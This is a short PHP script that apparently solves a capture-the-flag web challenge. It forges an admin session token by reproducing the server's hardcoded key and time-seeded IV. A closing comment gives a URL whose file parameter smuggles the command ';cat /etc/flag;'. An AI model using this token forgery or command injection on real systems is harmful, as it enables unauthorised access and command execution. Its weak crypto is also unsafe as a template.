<?php
define("KEY","8690475385984657");
define("method","aes-128-cfb");
define("BS",16);
define("IDENTIFY","9850375038");

function getkey(){
    return KEY;
}

function get_identify(){
    return IDENTIFY;
}

function get_token(){
    $token = '';
    for($i=0;$i<16;$i++){
        $token .= chr(rand(1,255));
    }
    return $token;
}

function to($str) {
    return $str . str_repeat(chr(BS - strlen($str) % BS), (BS - strlen($str) % BS));
}

function encrypt($str){
    $key = getkey();
    srand(time() / 300);
    $token = get_token();
    $cipher = bin2hex(mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, to($str), MCRYPT_MODE_CFB, $token));
    return base64_encode($cipher);
}

$username = 'qwer';
$md5 = md5(get_identify().$username);
$admin = '3';
$token = encrypt($username . '|' . $admin . '|' . $md5);
echo $token;
echo "\n";

// web.suctf.asuri.org:83/admin.php?action=viewImage&file=;cat%20/etc/flag;